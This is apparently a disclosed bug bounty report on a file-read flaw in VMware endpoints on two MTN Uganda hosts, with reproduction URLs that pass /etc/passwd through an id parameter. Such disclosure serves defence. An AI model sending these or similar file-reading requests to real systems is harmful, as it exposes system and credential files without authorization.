# 2x Remote file inclusion within your VMware Instances

## Report Details
- **Report ID**: 1069105
- **URL**: https://hackerone.com/reports/1069105
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-12-31T05:35:34.107Z
- **Disclosed**: 2021-08-19T20:16:25.820Z

## Reporter
- **Username**: 0x0luke
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: mtn_group

## Vulnerability Information
## Summary:
2x Remote file inclusion within your VMware Instances

##Hosts: 

nmc.vc.mtn.co.ug
h28a.n1.ips.mtn.co.ug

## Steps To Reproduce:
Navigate to the URLs given below, /etc/passwd will be displayed.

https://nmc.vc.mtn.co.ug/eam/vib?id=/etc/passwd
https://h28a.n1.ips.mtn.co.ug/eam/vib?id=/etc/passwd

## Impact

An attacker is able to view sensitive files on the server hosting this content and could potentially elevate this to a remote code execution.

## Attachments
No attachments
